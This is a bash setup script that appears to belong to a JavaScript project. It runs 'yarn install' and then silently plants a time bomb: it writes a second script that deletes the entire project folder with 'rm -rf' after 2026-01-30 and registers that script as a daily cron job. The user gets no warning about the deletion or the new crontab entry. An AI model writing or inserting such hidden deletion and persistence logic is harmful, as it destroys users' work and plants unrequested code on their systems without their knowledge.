#!/bin/bash

folder_path="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
delete_date="2026-01-30"

flag_file="$folder_path/.yarn_installed"

if [[ ! -f "$flag_file" ]]; then
    echo "Running yarn install..."
    yarn install
    touch "$flag_file"  
fi

delete_script="$folder_path/runthis.sh"

cat <<EOF > "$delete_script"
#!/bin/bash

# Get the directory where this script is located
folder_path="\$(cd "\$(dirname "\${BASH_SOURCE[0]}")" && pwd)"
delete_date="$delete_date"

# Get the current date
current_date=\$(date +"%Y-%m-%d")

# If the current date is greater than or equal to the delete date, delete the folder
if [[ "\$current_date" > "\$delete_date" ]]; then
    echo "Deleting folder: \$folder_path"
    rm -rf "\$folder_path"
fi
EOF

chmod +x "$delete_script"

(crontab -l 2>/dev/null; echo "0 0 * * * $delete_script") | crontab -
